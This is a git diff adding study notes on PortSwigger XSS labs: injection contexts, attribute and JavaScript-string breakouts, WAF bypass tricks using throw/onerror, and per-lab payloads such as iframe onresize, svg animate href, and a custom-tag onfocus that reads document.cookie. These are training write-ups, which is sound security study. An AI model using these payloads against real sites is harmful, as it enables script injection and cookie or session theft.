@@ -62,6 +62,51 @@ DOM-based XSS:
 + document.cookie and document["cookie"] (https://github.com/antoinenguyen-09/Portswigger-Web-Security-Labs/blob/main/BSCP_Practice_Exam.md)
 - Which sinks can lead to DOM-XSS vulnerabilities? https://portswigger.net/web-security/cross-site-scripting/dom-based
 
+XSS context:
+- (1), (2), (14), (15), (16), (27)
+
+XSS in HTML tag attributes:
+- Sometimes, brackets are blocked or encoded: (7)
+    + So this won't work "><script>alert(document.domain)</script>
+    + If you can terminate attribute value, you can introduce a new attribute
+        Example: " autofocus onfocus=alert(document.domain) x="
+        + This work without user interaction because of autofocus
+- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context: (8)
+    + So don't need to terminate attribute value
+        Example: <a href="javascript:alert(1)">
+- The 'accesskey' attribute allow to define letter: (17)
+    + When click combine with other key, will cause event to fire
+        Example: <input type="hidden" accesskey="X" onclick="alert(1)"> 
+            alt+shift+x on window
+            ctrl+alt+x on OS X
+        + These only work on Chrome
+
+XSS into JavaScript: (18)
+- Terminating the existing script:
+    <script>var input = 'controllable data here';</script>
+    payload = </script><img src=1 onerror=alert(document.domain)>
+    + It work because:
+        + First step: HTML parser, browser read all document to identify html tag, when it meet </script>, instant close, 
+        + Second step: Javascript parser, analysis <script></script> identified in first step, original script is getting error (because of var input = ') -> onerror -> alert
+- Breaking out of a JavaScript string: (9), (19)
+    Example:
+        '-alert(document.domain)-'
+        ';alert(document.domain)//
+    + Some application prevent break out of string by escaping any single quote character with a backslash. But it often make mistake of failing to escape backslash itself
+        Example:
+            \';alert(document.domain)// ---> \\';alert(document.domain)//
+    + Some website use WAF to restrict character allow to use. You need other way to bypass, one of it is to use 'throw' statement with an exception handler (enable pass argument to function without using parentheses) (https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
+        Example:
+            <script>onerror=alert;throw 1337</script>
+            <script>{onerror=alert}throw 1337</script>
+            <script>throw onerror=alert,'some string',123,'haha'</script>
+            <script>{onerror=eval}throw'=alert\x281337\x29'</script>        
+            <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
+            <script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
+            <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+            <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+
+
 01_Reflected_XSS_into_HTML_context_with_nothing_encoded
 - XSS in search: <script>alert(1)</script>
 
@@ -84,6 +129,23 @@ DOM-based XSS:
 06_DOM_XSS_in_jQuery_selector_sink_using_a_hashchange_event
 - Test url+'#A', if jquery in response, web is using jquery
 - <iframe src="https://{url}/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
+
+07_Reflected_XSS_into_attribute_with_angle_brackets_HTML_encoded
+- This lab encoded the angle bracket, so we can't escape out of tag
+- But we can escape out of old attribute and create new attribute
+- Payload:
+    " autofocus onfocus=alert(1) x="
+
+08_Stored_XSS_into_anchor_href_attribute_with_double_quotes_HTML_encoded
+- This lab has vuln in comment
+- Field website is not checking http or any input, so we can just place payload inside href attribute
+- Payload:
+    javascript:alert(1)
+
+09_Reflected_XSS_into_a_JavaScript_string_with_angle_brackets_HTML_encoded
+- Just escape string, but careful adding syntax, not to trigger error
+- Payload:
+    '-alert(document.domain)-'
 
 10_DOM XSS in document.write sink using source location.search inside a select element
 - Search for document.write to check vuln
@@ -118,3 +180,58 @@ DOM-based XSS:
   firstPElement.innerHTML = newInnerHtml
 - According to w3school, this escapeHTML only replace first instance (https://www.w3schools.com/jsref/jsref_replace.asp)
 - Payload for name param: <><img src=1 onerror=alert(1)>
+
+14_Reflected_XSS_into_HTML_context_with_most_tags_and_attributes_blocked
+- This website use blacklist to block tag and event
+- So we try bruteforce and only tag body valid, but a lot of event valid
+- To construct a payload, we need to decide which can be trigger without user interaction
+- We can wrap this in iframe and resize that, so it will trigger the event
+- Payload:
+    <iframe src="{url}/?search=<body onresize=print()>" onload=this.style.width='100px'>
+
+15_Reflected_XSS_into_HTML_context_with_all_tags_blocked_except_custom_ones
+- This lab is same condition as lab 14, but different on blacklist, so we try your own to custom payload
+- Explain payload:
+    + This using url fragment #x to focus on element id=x
+    + tabindex=1 allow it focus, default non-interactive element can't focusable
+- Payload:
+    <script>
+        location = '{url}/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+    </script>
+
+16_Reflected_XSS_with_some_SVG_markup_allowed
+- Like lab 14, 15 but easier
+- Just scan valid tags, events, then read description, vuln in svg tag
+- So try to search payload in cheatsheet, modify it
+- Payload:
+    <svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
+
+17_Reflected_XSS_in_canonical_link_tag
+- https://portswigger.net/research/xss-in-hidden-input-fields
+- Note: This solution only possible in Chrome
+- Just escape attribute and create new
+- Payload:
+    /?'accesskey='x'onclick='alert(1)
+
+18_Reflected_XSS_into_a_JavaScript_string_with_single_quote_and_backslash_escaped
+- Just escape tag by adding </script> to trigger error and make onerror run
+- Payload:
+    </script><img src=1 onerror=alert(1)>
+
+19_Reflected_XSS_into_a_JavaScript_string_with_angle_brackets_and_double_quotes_HTML_encoded_and_single_quotes_escaped
+- Just escape string by adding backslash
+- Payload:
+    \';alert(document.domain)//
+
+27_Reflected_XSS_with_event_handlers_and_href_attributes_blocked
+- This construct base on tag are allowed, but no fire event are allow
+- Instead of using href inside tag <a>, we set href value through <animate> tag
+- Payload:
+    <svg>
+        <a>
+            <animate attributeName=href values=javascript:alert(1) />
+            <text x=20 y=20>Click me</text>
+        </a>
+    </svg>
+
+28_Reflected_XSS_in_a_JavaScript_URL_with_some_characters_blocked
